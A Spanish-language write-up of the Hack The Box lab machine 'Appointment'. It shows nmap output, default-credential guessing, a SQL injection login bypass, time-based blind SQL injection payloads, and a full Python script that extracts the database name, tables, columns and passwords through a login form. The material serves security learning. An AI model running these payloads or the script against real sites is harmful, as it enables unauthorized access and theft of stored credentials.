---
description: Maquina HTB starting point Tier 1
---

# Appointment

Seguimos con la lista de máquinas facilitas de HTB, sigo recomendando que si estás empezando las hagas y además leas los WalkThrough los cuales explican información muy interesante.

En este caso como siempre vamos a comenzar enumerando el sistema

```
nmap -p- --open -n -T5 10.129.161.134 -vvv

Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-18 15:29 CEST
Initiating Ping Scan at 15:29
Scanning 10.129.161.134 [2 ports]
Completed Ping Scan at 15:29, 0.04s elapsed (1 total hosts)
Initiating Connect Scan at 15:29
Scanning 10.129.161.134 [65535 ports]
Discovered open port 80/tcp on 10.129.161.134
Connect Scan Timing: About 33.43% done; ETC: 15:31 (0:01:02 remaining)
Connect Scan Timing: About 62.62% done; ETC: 15:31 (0:00:38 remaining)
Completed Connect Scan at 15:31, 109.95s elapsed (65535 total ports)
Nmap scan report for 10.129.161.134
Host is up, received syn-ack (0.042s latency).
Scanned at 2021-10-18 15:29:42 CEST for 110s
Not shown: 39426 closed tcp ports (conn-refused), 26108 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 110.06 seconds

```

Podemos ver que tenemos el puerto 80 abierto, así que tenemos que pensar ya que tienen un servicio web activo. Aunque siempre digo que una enumeración adecuada intentando sacar toda la información posible es importante también considero que hay veces que es preferible echar un ojo rápido por si acaso es más fácil de lo que pensábamos en un principio.

De todas maneras sería interesante terminar de enumerar con nmap, whatweb, fuzzear la web al completo y otras estrategias que comento en [Puerto 80](../pentesting/puertos/80-servidor-web/).

De todas formas en esta ocasión directamente me fui a ver que encontraba y me encontré con lo siguiente:

![](<../.gitbook/assets/image (29) (1) (1) (1).png>)

Eché un ojo al código fuente por si era así de fácil y de paso probé las credenciales básicas:

* admin/admin
* administrator/administrator
* admin/password
* root/root

Y unas pocas más que probé de forma rápida haciendo combinaciones, al no funcionar pensé en un posible [SQLI](../pentesting/puertos/80-servidor-web/sqli.md) y tiré por lo más fácil, el ultraconocido " ' or 1=1 -- - "

Y voilà estamos dentro, pero vamos a entender un poco que está pasando y porque funciona el "or 1=1" os recomiendo que leáis el Walkthrough que lo explica mucho más a fondo.

Básicamente lo que le estamos diciendo al servidor es que haga la siguiente consulta a la base de datos:

```
SELECT * FROM users WHERE username='' or 1=1 -- - AND password='1234'
```

Es decir, selecciona donde están los usuarios el que sea una cadena vacía y si no lo encuentras entonces comprueba si 1=1, todo lo demás lo comentamos con "-- -". La flag cambia a 1 y entonces nos deja pasar.

Otra opción podría ser utilizar un usuario, de hecho vamos a jugar con esto para conseguir más información y sacar partido a esta máquina.

Introducimos lo siguiente en el username "admin' and sleep(5) -- -" veremos cómo podríamos averiguar que efectivamente hay un usuario que se llama admin en la base de datos, lo que estamos diciendo al servidor es lo siguiente.

```
SELECT * FROM users WHERE username='admin' and sleep(5)-- - AND password='1'
```

Es decir, que si hay un usuario que se llame admin quiero que tardes 5 segundos en darme respuesta, si pusiésemos otro usuario que no exista no esperará porque la primera opción que es el username no se cumple.

¿Y si nos complicamos aún más e intentamos sacar la contraseña? podríamos hacer peticiones a la base de datos letra a letra para poder sacar la información.

Esta información la aprendí gracias a S4vitar así que os recomiendo encarecidamente que echéis un ojo a su contenido. Básicamente lo que podemos hacer es una serie de peticiones para conseguir el nombre de la base de datos, tablas, columnas y datos.

Si nosotros pusiésemos el siguiente payload en el campo de usuario "' or if(substr(database(),1,1)='a',sleep(5),1)-- -" nos mantendría a la espera 5 segundos, esto es porque la primer letra del nombre de la base de datos comienza por una a, de hecho podéis ir probando a mano a cambiar el "1,1" por "2,1;3,1" e ir probando letras y veríais que al final conseguis el nombre de la base de datos "appdb"

Pero no vamos a hacer las cosas a mano sino que podemos hacer un script que nos lo automatice, por ejemplo con python:

```
#!/usr/bin/python3

import requests, time, sys, signal
from pwn import *

def def_handler(sig, frame):
	log.failure("Saliendo...")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

#Cambiar por la URL en la que inyectar SQL
url = 'http://10.129.161.192/'
s = r'0123456789abcdefghijklmnopqrstuvwxyz'
t = 5
database = ''
tabla = ''
columna = ''
resultado = ''
lista_tablas = []
lista_columnas = []
lista_resultados = []
lista_columnas_tablas = []

def check(payload):

	#Cambiar por el post de inicio de sesión
	data_post = {
		'username': '%s' % payload,
		'password': 'test'
	}

	time_start = time.time()
	content = requests.post(url, data=data_post)
	time_end = time.time()

	if time_end - time_start > 3:
		return 1

p2 = log.progress("Payload")
p1 = log.progress("Datos")


for i in range(1, 50):
	for c in s:
		payload = "' or if(substr(database(),%d,1)='%c',sleep(%d),1)-- -" % (i, c, t)

		p2.status("%s" % payload)

		if check(payload):
			database += c
			p1.status("%s" % database)
			break

	if len(database) != i:
		break

log.info("Database: %s" % database)

#Comenzamos a sacar las tablas


for j in range(0, 50):
	for i in range(1, 50):
		for c in s:
			payload= "' or if(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1)='%c',sleep(%d),1)-- -" % (database, j, i, c, t)

			p2.status("%s" % payload)

			if check(payload):
	                        tabla += c
        	                p1.status("%s" % tabla)
                	        break

		if len(tabla) != i:
			if len(tabla) != 0:
				lista_tablas.append(tabla)
				log.info("Tabla [%d]: %s" % (j, tabla))
				tabla = ''
			break

	jmod = j + 1

	if len(lista_tablas) != jmod:
		break


for a in lista_tablas:

	for j in range(0, 50):
		for i in range(1, 50):
			for c in s:
				payload = "' or if(substr((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1),%d,1)='%c',sleep(%d),1)-- -" % (database, a, j, i, c, t)

				p2.status("%s" % payload)

				if check(payload):
					columna += c
					p1.status("%s" % columna)
					break

			if len(columna) != i:
				if len(columna) != 0:
					log.info("Columna [%d] en %s: %s" % (j, a, columna))
					lista_columnas.append(columna)
					columna = ''
				break

		jmod = j + 1

		if len(lista_columnas) != jmod:
			lista_columnas_tablas.append(lista_columnas)
			break


for b in range(0, len(lista_columnas_tablas)):
	print(lista_columnas_tablas[b])
	for a in lista_columnas_tablas[b]:

		for j in range(0, 100):
			for i in range(1, 100):

				for c in s:
					payload = "' or if(substr((select %s from %s limit %d,1),%d,1)='%s',sleep(%d),1)-- -" % (a, lista_tablas[b], j, i, c, t)

					p2.status("%s" % payload)

					if check(payload):
						resultado += c
						p1.status("%s" % resultado)
						break

				if len(resultado) != i:
					if len(resultado) != 0:
						log.info("%s [%s] de %s: %s" % (a, j, lista_tablas[b], resultado))
						lista_resultados.append(resultado)
						resultado = ''
					break

			jmod = j + 1

			if len(lista_resultados) != jmod:
				lista_resultados = []
				break

```

El script aún no lo he limpiado, mejorado ni he hecho un output extremadamente agradable pero al final del todo el resultado es algo así:

![](<../.gitbook/assets/image (26) (1) (1) (1) (1).png>)

Si probamos directamente con el usuario test y la contraseña bababa podemos acabar la máquina.

Me di cuenta que no funcionaba la contraseña del usuario admin, pero si la del usuario test no estaba hasheada tampoco tenía sentido la del usuario admin. Entonces fue cuando probando vi que no estaba probando caracteres especiales. Tras un par de añadidos al script el resultado fue el siguiente:

![](<../.gitbook/assets/image (28) (1) (1) (1) (1).png>)

Cómo veis la contraseña de admin era más larga que el output que vimos al principio porque no habíamos probado ningún caracter especial. El script al completo lo publicaré en mi GitHub y lo compartiré por aquí en cuanto lo haya hecho.

Espero que os haya resultado interesante y que hayáis visto cómo de una máquina que se puede acabar en menos de 5 minutos hemos sacado información tan útil y hemos aprendido un poco más de programación en Python, todo el pack en uno.
